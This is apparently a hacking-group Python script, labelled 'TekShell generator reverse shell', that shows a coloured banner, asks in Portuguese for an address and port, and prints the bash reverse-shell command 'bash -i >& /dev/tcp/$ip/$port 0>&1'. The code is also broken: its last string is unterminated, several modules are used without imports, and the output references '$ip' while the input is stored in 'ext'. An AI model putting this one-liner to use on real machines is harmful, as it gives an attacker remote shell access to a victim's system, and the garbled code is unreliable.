from colorama import init, Fore, Back, Style

init(autoreset=True)

def animated_marker():

    widgets = ['\033[94m[\033[97m#\033[94m]\033[97mLoading: ', progressbar.AnimatedMarker()]

    bar = progressbar.ProgressBar(widgets=widgets).start()

    for i in range(50):

        time.sleep(0.1)

        bar.update(i)

def cls():

    os.system("clear||cls")

cls()

print("""

            \033[94m [ \033[0m \033[1;37;41mTekShell generator reverse shell \033[0m \033[94m ] \033[0m

\033[1;49;35m████████╗███████╗██╗  ██╗\033[4;49;96m███████╗██╗  ██╗███████╗██╗     ██╗\033[0m

\033[1;49;35m╚══██╔══╝██╔════╝██║ ██╔╝\033[4;49;96m██╔════╝██║  ██║██╔════╝██║     ██║\033[0m

\033[1;49;35m   ██║   █████╗  █████╔╝ \033[4;49;96m███████╗███████║█████╗  ██║     ██║\033[0m

\033[1;49;35m   ██║   ██╔══╝  ██╔═██╗ \033[4;49;96m╚════██║██╔══██║██╔══╝  ██║     ██║\033[0m

\033[1;49;35m   ██║   ███████╗██║  ██╗\033[4;49;96m███████║██║  ██║███████╗███████╗███████╗\033[0m

\033[1;49;35m   ╚═╝   ╚══════╝╚═╝  ╚═╝\033[4;49;96m╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝\033[0m

            \033[1;37;41mCodded By: CharseSec\033[0m - \033[1;37;41mLybeSec Group\033[0m""")

ext = input("\033[1;37;41mQUAL ENDERECO? >>\033[0m")

port = input("\033[1;37;41mDIGITE A PORTA >>\033[0m")

print(f"bash -i >& /dev/tcp/$ip/$port 0>&1
